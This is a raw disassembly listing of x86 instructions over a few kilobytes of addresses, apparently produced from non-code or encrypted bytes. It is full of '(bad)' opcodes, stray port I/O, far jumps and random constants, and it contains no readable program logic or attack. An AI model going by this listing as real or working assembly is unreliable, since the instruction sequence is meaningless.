  4097d7:	cmp    bl,BYTE PTR ds:0x86212bb3
  4097dd:	in     ax,dx
  4097df:	pop    ebx
  4097e0:	sbb    al,0x96
  4097e2:	(bad)  
  4097e4:	and    cl,0x8b
  4097e7:	and    cl,BYTE PTR [edi-0x6e0ccad6]
  4097ed:	lea    esi,[eax-0x3a]
  4097f0:	pop    ebp
  4097f1:	xor    al,0x61
  4097f3:	cdq    
  4097f4:	xchg   esp,eax
  4097f5:	(bad)  
  4097f7:	out    dx,al
  4097f8:	in     al,dx
  4097f9:	fcomp  QWORD PTR [edx]
  4097fb:	rcl    DWORD PTR [esi-0x60],0x12
  4097ff:	in     eax,dx
  409800:	or     bh,0x7f
  409803:	fmul   st,st(0)
  409805:	push   eax
  409806:	in     eax,0x66
  409808:	(bad)  
  409809:	imul   edx,ebx,0x21
  40980c:	xchg   edx,eax
  40980d:	mov    cl,0x56
  40980f:	push   ebp
  409810:	rcl    DWORD PTR [ecx+0x12],0xbb
  409814:	jno    0x409797
  409816:	dec    esi
  409817:	pop    ebp
  409818:	outs   dx,BYTE PTR ds:[esi]
  409819:	xchg   edi,eax
  40981a:	push   ecx
  40981b:	(bad)  
  40981c:	sub    bl,al
  40981e:	add    eax,0xa86dbd3f
  409823:	dec    ebx
  409824:	xor    eax,0x9ebc0e9e
  409829:	mov    ch,0xea
  40982b:	div    esi
  40982d:	fwait
  40982e:	pushf  
  40982f:	and    eax,0xdb2b180e
  409834:	lods   al,BYTE PTR ds:[esi]
  409835:	jae    0x409858
  409837:	ins    BYTE PTR es:[edi],dx
  409838:	repnz inc esp
  40983a:	cmp    ah,bh
  40983c:	mov    al,0x7f
  40983e:	and    al,0x80
  409840:	scas   al,BYTE PTR es:[edi]
  409841:	inc    edx
  409842:	lods   eax,DWORD PTR ds:[esi]
  409843:	inc    esi
  409844:	dec    cl
  409846:	mov    edi,0xe176db99
  40984b:	dec    edi
  40984c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40984d:	xchg   ebx,eax
  40984e:	mov    dh,BYTE PTR [ecx]
  409850:	mov    eax,0xbca92e2c
  409855:	jmp    0x74d8ff22
  40985a:	fcmovbe st,st(6)
  40985c:	mov    esi,es
  40985e:	mov    ch,0x5
  409860:	push   eax
  409861:	ret    
  409862:	enter  0x7fee,0xe9
  409866:	xchg   edx,eax
  409867:	add    BYTE PTR [ecx+0x61],ah
  40986a:	ss adc eax,0x7a2172f6
  409870:	stos   BYTE PTR es:[edi],al
  409871:	mov    al,0xb6
  409873:	dec    ecx
  409874:	sbb    DWORD PTR [edi+0xc],0x6944cec9
  40987b:	push   cs
  40987c:	jmp    0x85ee:0x20d249e6
  409883:	call   0xb78:0xa223db32
  40988a:	jge    0x4098ef
  40988c:	mov    edi,0xa848a22
  409891:	shr    bl,0xc8
  409894:	jmp    DWORD PTR [ecx+ebp*1-0x7c0de1b3]
  40989b:	into   
  40989c:	arpl   cx,ax
  40989e:	sbb    al,0xdc
  4098a0:	cmp    al,0xe2
  4098a2:	xor    eax,0x5eefca34
  4098a7:	std    
  4098a8:	pop    esi
  4098a9:	outs   dx,BYTE PTR ds:[esi]
  4098aa:	push   ds
  4098ab:	das    
  4098ac:	aad    0x85
  4098ae:	rcr    DWORD PTR [edi],1
  4098b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4098b1:	inc    esi
  4098b2:	lahf   
  4098b3:	push   eax
  4098b4:	mov    ds:0xfe0c6df8,eax
  4098b9:	setp   BYTE PTR [edi-0x3b]
  4098bd:	cmp    al,BYTE PTR [ecx-0x42]
  4098c0:	pop    ds
  4098c1:	and    ch,BYTE PTR [ebx+0x5c]
  4098c4:	xor    BYTE PTR [ebp-0xf585689],0x3
  4098cb:	mov    ch,0xff
  4098cd:	add    bl,cl
  4098cf:	xchg   esp,eax
  4098d0:	aad    0x98
  4098d2:	imul   esp,DWORD PTR [ecx],0x57
  4098d5:	add    al,0xf5
  4098d7:	pushf  
  4098d8:	nop
  4098d9:	pop    edi
  4098da:	add    ch,BYTE PTR ds:0x14a1bdd1
  4098e0:	dec    ecx
  4098e1:	mov    ds:0x2fea3550,eax
  4098e6:	cmp    edx,ebp
  4098e8:	fcomp  QWORD PTR [eax-0x5e]
  4098eb:	pop    esi
  4098ec:	jno    0x409949
  4098ee:	adc    al,0x33
  4098f0:	xor    eax,0xfc11f720
  4098f5:	fmul   QWORD PTR [edx+0x16fe24ed]
  4098fb:	ss ret 0x8e20
  4098ff:	int    0x9a
  409901:	frstor [edx+0x79947ff0]
  409907:	xchg   ebx,eax
  409908:	inc    ecx
  409909:	xchg   DWORD PTR [ebp-0x2283c67f],esp
  40990f:	cmp    eax,0x65e35243
  409914:	cmp    al,0x27
  409916:	pusha  
  409917:	jmp    0x1c0bd186
  40991c:	shr    DWORD PTR [edx+0x5e],cl
  40991f:	cmp    eax,0xf12a5b3
  409924:	add    BYTE PTR [ebp+0x64],0x6c
  409928:	(bad)  
  409929:	xlat   BYTE PTR ds:[ebx]
  40992a:	stos   BYTE PTR es:[edi],al
  40992b:	cwde   
  40992c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40992d:	and    DWORD PTR [edi],edx
  40992f:	xchg   ecx,eax
  409930:	imul   ecx,DWORD PTR [ecx-0x66],0x389ec55e
  409937:	jp     0x409917
  409939:	out    0xfc,eax
  40993b:	mov    ebx,0x76836c99
  409940:	xchg   BYTE PTR [ebp+0x4660961b],bl
  409946:	enter  0x8473,0xfe
  40994a:	and    eax,0x218aeebc
  40994f:	cmp    BYTE PTR [edx+0x796b02b9],al
  409955:	icebp  
  409956:	shl    BYTE PTR [edi],1
  409958:	inc    ebx
  409959:	mov    al,ds:0x445653e4
  40995e:	adc    eax,0x1678dc4a
  409963:	shl    BYTE PTR fs:[ebx-0x5adfa043],0x47
  40996b:	clc    
  40996c:	push   ss
  40996d:	scas   al,BYTE PTR es:[edi]
  40996e:	sti    
  40996f:	jg     0x409905
  409971:	pop    ss
  409972:	scas   eax,DWORD PTR es:[edi]
  409973:	cmp    edi,DWORD PTR [esi]
  409975:	lock push edx
  409977:	adc    DWORD PTR [esi+0x58],eax
  40997a:	int    0x4d
  40997c:	retf   
  40997d:	xor    edx,ecx
  40997f:	mov    edx,0xf3bfd1be
  409984:	jle    0x40991b
  409986:	or     eax,0x31a0fa82
  40998b:	pop    ds
  40998c:	lahf   
  40998d:	hlt    
  40998e:	jns    0x4099c5
  409990:	jno    0x4099a8
  409992:	sti    
  409993:	mov    cl,0xcc
  409995:	add    eax,0xd8a6c8bc
  40999a:	aam    0x8f
  40999c:	in     eax,dx
  40999d:	in     eax,dx
  40999e:	inc    esi
  40999f:	nop
  4099a0:	stc    
  4099a1:	sub    BYTE PTR [ecx+0x35],al
  4099a4:	repnz outs dx,BYTE PTR ds:[esi]
  4099a6:	es loop 0x4099a7
  4099a9:	xor    bh,bh
  4099ab:	or     BYTE PTR es:[eax],dl
  4099ae:	jge    0x4099d4
  4099b0:	jmp    0x4099e0
  4099b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4099b3:	fild   WORD PTR [ebp-0x3f]
  4099b6:	idiv   BYTE PTR [eax-0x1d]
  4099b9:	clc    
  4099ba:	ret    
  4099bb:	jmp    0x4fe0:0x91943b48
  4099c2:	scas   eax,DWORD PTR es:[edi]
  4099c3:	jg     0x4099ef
  4099c5:	pop    edx
  4099c6:	jmp    0xdc1c1bae
  4099cb:	mov    edi,0x6982203
  4099d0:	fnstcw WORD PTR [ebx]
  4099d2:	int    0xc9
  4099d4:	inc    esi
  4099d5:	push   ebp
  4099d6:	repz xchg edi,eax
  4099d8:	enter  0xe3a2,0x44
  4099dc:	test   edx,ebp
  4099de:	sbb    al,0xfd
  4099e0:	retf   
  4099e1:	or     DWORD PTR [eax-0x2db36813],0xffffffd1
  4099e8:	test   eax,0x8afa11f6
  4099ed:	mov    ds:0x1679b6fb,eax
  4099f2:	(bad)  
  4099f3:	and    BYTE PTR [edi+0x6517af07],dh
  4099f9:	popf   
  4099fa:	push   esp
  4099fb:	mov    eax,ds:0x456ed9a8
  409a00:	cwde   
  409a01:	adc    al,0x7
  409a03:	adc    eax,0xc1eb7e7e
  409a08:	loop   0x409a2a
  409a0a:	cmp    esi,DWORD PTR [ebx]
  409a0c:	lahf   
  409a0d:	push   edx
  409a0e:	dec    esp
  409a0f:	push   edx
  409a10:	pop    esp
  409a11:	add    esp,DWORD PTR ds:0xeddb37ba
  409a17:	js     0x409a70
  409a19:	dec    edx
  409a1a:	inc    edx
  409a1b:	ss push cs
  409a1d:	and    cl,dl
  409a1f:	pop    ebx
  409a20:	xchg   ebp,eax
  409a21:	xor    dl,BYTE PTR [edx+eax*4-0x60909db7]
  409a28:	mov    ch,al
  409a2a:	xchg   BYTE PTR [ebx+0x64],dh
  409a2d:	pop    eax
  409a2e:	iret   
  409a2f:	cmp    eax,DWORD PTR [ecx]
  409a31:	in     al,dx
  409a32:	xor    ebp,esp
  409a34:	in     al,0xa7
  409a36:	in     eax,0xa8
  409a38:	retf   
  409a39:	mov    bh,0xbb
  409a3b:	push   esp
  409a3c:	push   esp
  409a3d:	adc    al,0xcf
  409a3f:	cmp    eax,0x5f590440
  409a44:	cli    
  409a45:	inc    ebp
  409a46:	xchg   ebx,eax
  409a47:	pusha  
  409a48:	xor    al,0xc1
  409a4a:	in     al,dx
  409a4b:	jbe    0x409a27
  409a4d:	mov    ah,0xd1
  409a4f:	adc    DWORD PTR [ebx+0xa],edi
  409a52:	xlat   BYTE PTR ds:[ebx]
  409a53:	pushf  
  409a54:	pop    edi
  409a55:	repz test DWORD PTR [edi+0x560222a8],0x91ba9b93
  409a60:	push   edx
  409a61:	add    DWORD PTR [edi-0x57ce0854],esi
  409a67:	sbb    dh,bh
  409a69:	shl    bl,1
  409a6b:	inc    ebp
  409a6c:	xor    ebx,DWORD PTR [edx+ebp*8+0x1d3ac52e]
  409a73:	push   edx
  409a74:	xchg   DWORD PTR [edx],ebx
  409a76:	popa   
  409a77:	rcr    BYTE PTR [eax],cl
  409a79:	icebp  
  409a7a:	in     eax,0xfe
  409a7c:	fdivp  st(0),st
  409a7e:	xchg   ebp,eax
  409a7f:	xchg   edi,eax
  409a80:	sub    ah,BYTE PTR [ebp+0x6c]
  409a83:	mov    ds,WORD PTR [esi-0xd]
  409a86:	gs jbe 0x409a78
  409a89:	ins    BYTE PTR es:[edi],dx
  409a8a:	jbe    0x409ace
  409a8c:	mov    BYTE PTR [ebx],dh
  409a8e:	xor    bh,BYTE PTR [edx+0x43f84b3d]
  409a94:	mov    bl,0x77
  409a96:	popf   
  409a97:	jbe    0x409a84
  409a99:	cdq    
  409a9a:	pop    ss
  409a9b:	push   es
  409a9c:	mov    ah,0xb7
  409a9e:	add    esi,DWORD PTR [ebp+edi*8-0x6a]
  409aa2:	add    bh,ah
  409aa4:	stos   DWORD PTR es:[edi],eax
  409aa5:	xor    BYTE PTR [esi+esi*8+0x7f],bh
  409aa9:	test   BYTE PTR cs:[edx],cl
  409aac:	icebp  
  409aad:	jmp    0xb97a:0x8dbb42f3
  409ab4:	mov    ah,dl
  409ab6:	nop
  409ab7:	addr16 xchg esp,eax
  409ab9:	rcl    DWORD PTR [eax],0x8a
  409abc:	jo     0x409a81
  409abe:	out    dx,eax
  409abf:	or     al,0xd6
  409ac1:	xchg   bl,cl
  409ac3:	fisttp QWORD PTR [ebp-0x5f]
  409ac6:	shl    DWORD PTR [esi+ecx*4],1
  409ac9:	shl    DWORD PTR [esi-0x31],cl
  409acc:	push   eax
  409acd:	mov    bl,BYTE PTR [ebx]
  409acf:	xor    al,0xde
  409ad1:	mov    ah,0x9
  409ad3:	cmp    ebx,DWORD PTR [edx]
  409ad5:	add    esi,0x53
  409ad8:	outs   dx,BYTE PTR ds:[esi]
  409ad9:	fcom   DWORD PTR [edi+0x70c9325e]
  409adf:	ins    DWORD PTR es:[edi],dx
  409ae0:	jl     0x409b05
  409ae2:	rcl    ecx,0xda
  409ae5:	mov    ecx,fs
  409ae7:	jge    0x409a70
  409ae9:	idiv   BYTE PTR [eax-0x21cca4c8]
  409aef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409af0:	inc    esi
  409af1:	lds    ebp,FWORD PTR [ecx*2+0x1544e150]
  409af8:	push   es
  409af9:	mov    dl,0x35
  409afb:	sbb    BYTE PTR [ecx-0x3f902cf3],cl
  409b01:	sbb    dl,bh
  409b03:	jecxz  0x409b1e
  409b05:	mov    ebp,DWORD PTR [ebx-0x53]
  409b08:	daa    
  409b09:	icebp  
  409b0a:	inc    edx
  409b0b:	xchg   edx,eax
  409b0c:	cmp    eax,0x6cc8bfc8
  409b11:	gs popa 
  409b13:	mov    DWORD PTR [eax],edx
  409b15:	adc    al,0x57
  409b17:	popf   
  409b18:	retf   0x7bae
  409b1b:	xor    cl,cl
  409b1d:	sbb    ebx,edi
  409b1f:	jns    0x409b00
  409b21:	loope  0x409b20
  409b23:	es push esi
  409b25:	mov    esp,0xd60954f5
  409b2a:	jo     0x409ae7
  409b2c:	push   edi
  409b2d:	mov    bh,0x4b
  409b2f:	sahf   
  409b30:	jge    0x409ac8
  409b32:	pop    ebx
  409b33:	stc    
  409b34:	int    0x85
  409b36:	repnz and DWORD PTR [ebp+0x7dd8b8bb],eax
  409b3d:	cli    
  409b3e:	fnstcw WORD PTR [esi]
  409b40:	ret    
  409b41:	stos   BYTE PTR es:[edi],al
  409b42:	pop    eax
  409b43:	imul   esi,DWORD PTR [ebx+esi*2+0x3ec7550e],0xffffff9c
  409b4b:	xchg   edi,eax
  409b4c:	js     0x409ad9
  409b4e:	inc    edi
  409b4f:	mov    ebx,0x152afe0b
  409b54:	jg     0x409bca
  409b56:	sbb    edi,0x25356c4a
  409b5c:	daa    
  409b5d:	jmp    DWORD PTR [edi+0x33]
  409b60:	mov    ch,0x2d
  409b63:	xchg   edi,eax
  409b64:	leave  
  409b65:	and    ah,BYTE PTR [ebx-0x30]
  409b68:	mov    ch,0x54
  409b6a:	mov    WORD PTR [eax+esi*2-0x45c08c9e],ss
  409b71:	and    ah,BYTE PTR [ecx-0x5ce5a509]
  409b77:	and    DWORD PTR [eax-0x229edd49],eax
  409b7d:	and    dl,ah
  409b7f:	push   ds
  409b80:	dec    ebx
  409b81:	adc    eax,0x7f388ab8
  409b86:	mov    esp,DWORD PTR [edx+0x5]
  409b89:	push   0xffffff98
  409b8b:	add    al,0x8e
  409b8d:	pop    ebx
  409b8e:	data16 fst DWORD PTR [edx+0x351d7b7]
  409b95:	pop    esp
  409b96:	adc    DWORD PTR [edx+0x5e4df52d],eax
  409b9c:	xchg   ecx,eax
  409b9d:	(bad)  
  409b9e:	sbb    bl,BYTE PTR [ebx-0x41]
  409ba1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ba2:	or     bl,BYTE PTR [edi-0x16]
  409ba5:	std    
  409ba6:	cld    
  409ba7:	scas   al,BYTE PTR es:[edi]
  409ba8:	mov    edx,0xa86c22ae
  409bad:	add    bl,ch
  409baf:	and    dl,BYTE PTR [edx+0x59]
  409bb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bb3:	push   esp
  409bb4:	aas    
  409bb5:	fistp  QWORD PTR [edx-0x4da8dfb5]
  409bbb:	pop    edx
  409bbc:	test   al,0x5d
  409bbe:	call   0x1a5d:0x5bd91c5f
  409bc5:	ja     0x409bbd
  409bc7:	shl    DWORD PTR [ebp+0x18],1
  409bca:	(bad)  
  409bcb:	sub    al,0x1f
  409bcd:	dec    esi
  409bce:	lods   eax,DWORD PTR ds:[esi]
  409bcf:	inc    esi
  409bd0:	jns    0x409c2e
  409bd2:	sbb    ah,bl
  409bd4:	test   BYTE PTR [esi+0x1495f1d7],ch
  409bda:	cmp    BYTE PTR [eax],dh
  409bdc:	ins    BYTE PTR es:[edi],dx
  409bdd:	push   ds
  409bde:	rcl    DWORD PTR [edx+0x59ae3946],1
  409be4:	data16 mov es,WORD PTR fs:[esi+0xfdf4b49]
  409bec:	adc    edi,DWORD PTR [ebx+0x5d8b75e5]
  409bf2:	push   ds
  409bf3:	cmp    BYTE PTR [ecx-0x4f],al
  409bf6:	sbb    eax,0xdc895b76
  409bfb:	push   edx
  409bfc:	es xchg ecx,eax
  409bfe:	mov    cl,0x2b
  409c00:	or     dl,dh
  409c02:	bound  ebx,QWORD PTR [eax-0x61]
  409c05:	mov    ds:0x859f815b,eax
  409c0a:	sbb    ah,0xd2
  409c0d:	and    bh,BYTE PTR [edx+ecx*1+0x49]
  409c11:	inc    eax
  409c12:	mov    ebp,ebp
  409c14:	xor    BYTE PTR [edx],ch
  409c16:	or     al,0xc
  409c18:	adc    al,0xb8
  409c1a:	mov    WORD PTR [edi],fs
  409c1c:	retf   
  409c1d:	cmp    dh,bh
  409c1f:	or     al,0x9e
  409c21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c22:	inc    edx
  409c23:	push   cs
  409c24:	fild   WORD PTR [ecx]
  409c26:	sti    
  409c27:	add    ebp,DWORD PTR [ecx-0x7e7d3b15]
  409c2d:	repnz pop esi
  409c2f:	mov    edi,esp
  409c31:	mov    edx,0x5f42dda6
  409c36:	out    dx,al
  409c37:	sub    al,0xde
  409c39:	mov    cl,0x2a
  409c3b:	xchg   ecx,eax
  409c3c:	jecxz  0x409c37
  409c3e:	dec    ebp
  409c3f:	sahf   
  409c40:	sub    eax,0x373cab69
  409c45:	pop    ss
  409c46:	mov    eax,ds:0xd18d8f2d
  409c4b:	mov    al,0xb2
  409c4d:	stos   BYTE PTR es:[edi],al
  409c4e:	mov    edi,0xe78a7161
  409c53:	leave  
  409c54:	ficom  WORD PTR [ebp-0x4d5d228d]
  409c5a:	into   
  409c5b:	cs icebp 
  409c5d:	cld    
  409c5e:	sbb    DWORD PTR [eax],ebp
  409c60:	sti    
  409c61:	(bad)  
  409c62:	arpl   WORD PTR [ebx-0x6a0826b3],di
  409c68:	mov    esp,0x8b73a6b2
  409c6d:	dec    eax
  409c6e:	mov    eax,ds:0x85de8ae8
  409c73:	inc    ecx
  409c74:	adc    edi,DWORD PTR [ebp+0x66ae2dd1]
  409c7a:	repz rcr BYTE PTR [edi+0xe44264c],cl
  409c81:	sub    edx,DWORD PTR [ecx+0x39aecd58]
  409c87:	iret   
  409c88:	jo     0x409c20
  409c8a:	sub    ecx,edi
  409c8c:	outs   dx,DWORD PTR ds:[esi]
  409c8d:	or     ebx,DWORD PTR [esi-0x3cd1d571]
  409c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409c94:	push   esp
  409c95:	stc    
  409c96:	into   
  409c97:	ss inc ecx
  409c99:	call   0x7705fb34
  409c9e:	mov    ebp,0xccc7362d
  409ca3:	ret    0xeab7
  409ca6:	test   DWORD PTR [eax+0x54],0x31e5f24a
  409cad:	mov    al,0x6
  409caf:	das    
  409cb0:	jae    0x409c41
  409cb2:	push   0x548eb64e
  409cb7:	cmc    
  409cb8:	arpl   WORD PTR [ebx],dx
  409cba:	sar    esp,1
  409cbc:	out    0xab,al
  409cbe:	sahf   
  409cbf:	mov    esp,0x836d36a0
  409cc4:	mov    bh,0x58
  409cc6:	cmp    dh,BYTE PTR [ebx]
  409cc8:	xchg   ebx,eax
  409cc9:	and    al,0x12
  409ccb:	adc    BYTE PTR ds:0x90461678,dh
  409cd1:	sub    al,0x11
  409cd3:	ret    
  409cd4:	inc    edi
  409cd5:	and    cl,BYTE PTR [ecx+0x11]
  409cd8:	mov    cl,BYTE PTR [esi]
  409cda:	ficomp WORD PTR [eax]
  409cdc:	pop    edi
  409cdd:	jp     0x409ca3
  409cdf:	sar    DWORD PTR [ebx+0x31],cl
  409ce2:	mov    dh,0x76
  409ce4:	or     esp,DWORD PTR [eax-0x3dac75c6]
  409cea:	aaa    
  409ceb:	cmc    
  409cec:	stos   DWORD PTR es:[edi],eax
  409ced:	in     eax,0xa0
  409cef:	and    DWORD PTR [esi],ebp
  409cf1:	fdiv   DWORD PTR [ebp+0x60]
  409cf4:	or     DWORD PTR [esi],0xffffffed
  409cf7:	out    dx,eax
  409cf8:	jl     0x409d17
  409cfa:	dec    ecx
  409cfb:	cmp    BYTE PTR [ecx],dl
  409cfd:	stos   DWORD PTR es:[edi],eax
  409cfe:	xor    ecx,DWORD PTR [edx-0x72]
  409d01:	mov    dh,0xfe
  409d03:	call   0x6df8536
  409d08:	scas   eax,DWORD PTR es:[edi]
  409d09:	rcr    BYTE PTR [eax+0x7d],0x92
  409d0d:	mov    ch,0xb0
  409d0f:	jl     0x409d76
  409d11:	mov    ds:0x18ebfc9c,eax
  409d16:	pop    esi
  409d17:	jecxz  0x409cec
  409d19:	cld    
  409d1a:	icebp  
  409d1b:	dec    ah
  409d1d:	les    ecx,FWORD PTR [eax-0x5b43edf7]
  409d23:	push   esi
  409d24:	or     DWORD PTR ds:0xa37e9b7e,esp
  409d2a:	jecxz  0x409cfe
  409d2c:	pop    ebp
  409d2d:	xchg   edi,eax
  409d2e:	sub    eax,0x4f4b9dd
  409d33:	clc    
  409d34:	xchg   esi,eax
  409d35:	xchg   DWORD PTR [ecx-0x5425a7b],ecx
  409d3b:	jne    0x409d5f
  409d3d:	repz mov al,0xb6
  409d40:	xor    ch,BYTE PTR [edx]
  409d42:	ins    DWORD PTR es:[edi],dx
  409d43:	addr16 cdq 
  409d45:	jb     0x409cf9
  409d47:	push   esp
  409d48:	dec    esp
  409d49:	mov    ebx,0x50fabd87
  409d4e:	jns    0x409d3d
  409d50:	and    ebp,DWORD PTR [esi]
  409d52:	add    dh,ch
  409d54:	hlt    
  409d55:	adc    eax,DWORD PTR [ebx]
  409d57:	icebp  
  409d58:	mov    bl,0x95
  409d5a:	ins    BYTE PTR es:[edi],dx
  409d5b:	and    DWORD PTR [edx+edx*8-0x13],edi
  409d5f:	add    eax,0x297be1e5
  409d64:	mov    cl,0x73
  409d66:	sbb    BYTE PTR [ecx],dl
  409d68:	push   edi
  409d69:	cld    
  409d6a:	sub    DWORD PTR [ebx],ebx
  409d6c:	das    
  409d6d:	jg     0x409ded
  409d6f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d70:	xlat   BYTE PTR ds:[ebx]
  409d71:	lods   al,BYTE PTR ds:[esi]
  409d72:	ret    
  409d73:	xor    edx,DWORD PTR [ecx-0x3c1b2d2a]
  409d79:	sbb    cl,dh
  409d7b:	push   es
  409d7c:	cmp    BYTE PTR [edi+0x86002c0],dl
  409d82:	rcr    BYTE PTR [ebx],1
  409d84:	sub    ah,BYTE PTR [esi+0x1]
  409d87:	jmp    DWORD PTR [ebp+0x1fe17528]
  409d8d:	cmc    
  409d8e:	cdq    
  409d8f:	call   0x11d79ff2
  409d94:	push   ds
  409d95:	cmp    al,0x6f
  409d97:	xor    al,0x83
  409d99:	dec    esp
  409d9a:	mov    cl,0xfa
  409d9c:	fs adc dh,0x4f
  409da0:	push   ebx
  409da1:	fs mov ecx,0x3e465d88
  409da7:	ja     0x409d44
  409da9:	xchg   ecx,eax
  409daa:	lds    edi,FWORD PTR [esi]
  409dac:	stos   BYTE PTR es:[edi],al
  409dad:	pop    esi
  409dae:	jecxz  0x409de1
  409db0:	aad    0xad
  409db2:	push   ecx
  409db3:	sub    eax,0xb1b5897f
  409db8:	cld    
  409db9:	(bad)  
  409dba:	mov    esi,cs
  409dbc:	ror    eax,cl
  409dbe:	not    DWORD PTR [eax-0x50b2b367]
  409dc4:	sub    eax,0x18163f66
  409dc9:	dec    esi
  409dca:	or     BYTE PTR [edx],bh
  409dcc:	add    ebx,DWORD PTR [ebx+edx*8-0x228bfdad]
  409dd3:	cmp    DWORD PTR [ebx],0xffffffcc
  409dd6:	cmc    
  409dd7:	idiv   DWORD PTR [edi+0x5082b42f]
  409ddd:	fcomp  DWORD PTR [eax]
  409ddf:	pop    ss
  409de0:	pop    ds
  409de1:	jle    0x409e40
  409de3:	mov    dh,0xb4
  409de5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409de6:	push   ebp
  409de7:	popa   
  409de8:	pop    esi
  409de9:	sbb    BYTE PTR [esi+0x71],dh
  409dec:	and    edi,DWORD PTR [edi+0x1917a52]
  409df2:	aaa    
  409df3:	sbb    al,0xa1
  409df5:	sbb    ebx,DWORD PTR [ecx+0x76]
  409df8:	push   ebp
  409df9:	adc    ebp,eax
  409dfb:	je     0x409e00
  409dfd:	div    al
  409dff:	adc    ebp,0x22
  409e02:	push   edi
  409e03:	sub    ebp,DWORD PTR [eax+0x58f21298]
  409e09:	sub    ch,ah
  409e0b:	adc    ebx,DWORD PTR [ecx]
  409e0d:	sub    al,0x5b
  409e0f:	rol    BYTE PTR [esi+0x245f05bc],cl
  409e15:	test   al,0x38
  409e17:	xor    esp,DWORD PTR [eax]
  409e19:	sbb    esp,ebx
  409e1b:	inc    eax
  409e1c:	mov    ebx,0x1605be94
  409e21:	test   DWORD PTR [ecx-0x5f444a69],0x837e1af5
  409e2b:	and    ch,BYTE PTR [esi-0x47]
  409e2e:	lods   eax,DWORD PTR ds:[esi]
  409e2f:	and    DWORD PTR [eax],0xffffffa6
  409e32:	dec    esp
  409e33:	ret    0x8629
  409e36:	in     al,0xf2
  409e38:	(bad)  
  409e39:	in     al,dx
  409e3a:	push   cs
  409e3b:	xchg   BYTE PTR [ebx-0x172ad097],bh
  409e41:	xor    dl,0x2
  409e44:	outs   dx,DWORD PTR ds:[esi]
  409e45:	in     eax,0x60
  409e47:	cwde   
  409e48:	aam    0x1f
  409e4a:	rcr    BYTE PTR [ecx+0x1de9bf53],1
  409e50:	sar    BYTE PTR [ecx-0x52],cl
  409e53:	jmp    eax
  409e55:	lea    eax,[eax+0x7c]
  409e58:	mov    esp,0xd8d90c2b
  409e5d:	jl     0x409e5a
  409e5f:	pop    ds
  409e60:	inc    ax
  409e62:	out    0xd5,eax
  409e64:	adc    DWORD PTR [eax+0x1bf028f6],eax
  409e6a:	mov    bl,BYTE PTR [edi]
  409e6c:	cmp    DWORD PTR [esi+0x7758d326],0x24613fff
  409e76:	and    al,0x5e
  409e78:	mov    ch,0x1f
  409e7a:	and    esi,edx
  409e7c:	cmc    
  409e7d:	test   eax,0xd4471aa
  409e82:	sub    eax,DWORD PTR [esi]
  409e84:	ins    BYTE PTR es:[edi],dx
  409e85:	fst    DWORD PTR [ebp-0x36]
  409e88:	jo     0x409ef6
  409e8a:	and    WORD PTR [ebx-0x2c],si
  409e8e:	mov    dh,0xb3
  409e90:	ins    BYTE PTR es:[edi],dx
  409e91:	inc    ebx
  409e92:	icebp  
  409e93:	in     al,0xd6
  409e95:	xlat   BYTE PTR ds:[ebx]
  409e96:	or     BYTE PTR [edi-0x54b786a1],ah
  409e9c:	jge    0x409e29
  409e9e:	mov    dl,0xba
  409ea0:	xchg   ecx,eax
  409ea1:	mov    DWORD PTR [ebp-0x6ba86de],edx
  409ea7:	data16 cs mov bh,0x10
  409eab:	jmp    0x409ec7
  409ead:	imul   eax,DWORD PTR [edi-0x35],0x320fac0a
  409eb4:	lds    ebx,FWORD PTR [esp+edi*2-0x6735bc79]
  409ebb:	loop   0x409efb
  409ebd:	or     ebx,DWORD PTR ds:0x2baf2855
  409ec3:	packsswb mm2,mm7
  409ec6:	(bad)  
  409ec7:	adc    ecx,DWORD PTR [edx-0x66bda355]
  409ecd:	iret   
  409ece:	pop    esi
  409ecf:	adc    DWORD PTR ds:0x94d4dc9,0xffffff8f
  409ed6:	fld    DWORD PTR [edi+eiz*2-0x2b]
  409eda:	add    eax,0x6b7d47c
  409edf:	je     0x409f40
  409ee1:	into   
  409ee2:	int    0x8f
  409ee4:	(bad)  
  409ee5:	pop    ss
  409ee6:	cmp    al,0x19
  409ee8:	popf   
  409ee9:	(bad)  
  409eea:	push   0xffffffb5
  409eec:	sub    ebp,DWORD PTR [ecx+esi*4+0x7c]
  409ef0:	fucomi st,st(0)
  409ef2:	or     al,ah
  409ef4:	mov    esp,0x190e793f
  409ef9:	iret   
  409efa:	shl    DWORD PTR [edi-0x6d8ece4f],1
  409f00:	and    DWORD PTR [eax],eax
  409f02:	int3   
  409f03:	call   0xe5aa:0xc71a3f14
  409f0a:	mov    dh,0x40
  409f0c:	aaa    
  409f0d:	sbb    eax,0x7a83ce58
  409f12:	inc    ecx
  409f13:	xor    al,0x69
  409f15:	jmp    0xaed8ff7c
  409f1a:	out    0x6a,eax
  409f1c:	call   0x487f:0x4e10fa55
  409f23:	pop    ss
  409f24:	add    esi,DWORD PTR [ecx-0x658b36ab]
  409f2a:	out    0xfe,eax
  409f2c:	xchg   ecx,eax
  409f2d:	inc    esi
  409f2e:	mov    bh,0x1e
  409f30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409f31:	and    bl,BYTE PTR [ecx]
  409f33:	sbb    eax,0xe24dcdd0
  409f38:	sub    DWORD PTR [ebx+0x2b],edx
  409f3b:	push   0xffffff8e
  409f3d:	ror    DWORD PTR [ecx],cl
  409f3f:	sub    BYTE PTR [ecx-0x8f63727],ah
  409f45:	xor    eax,0x66ddb007
  409f4a:	adc    DWORD PTR [eax+0x6e],0x22b5f21c
  409f51:	imul   ebx,DWORD PTR [edi+0x6e0dfae1],0xffffffdf
  409f58:	push   ebp
  409f59:	daa    
  409f5a:	sbb    eax,0x561b1287
  409f5f:	adc    al,0xaa
  409f61:	sub    BYTE PTR [ecx+0x6d5e4fa9],bl
  409f67:	xor    eax,0x6ea748fc
  409f6c:	sbb    BYTE PTR [eax-0x16743bfa],ch
  409f72:	push   cs
  409f73:	sbb    bl,BYTE PTR [ecx-0xe15f378]
  409f79:	daa    
  409f7a:	ret    0xb28
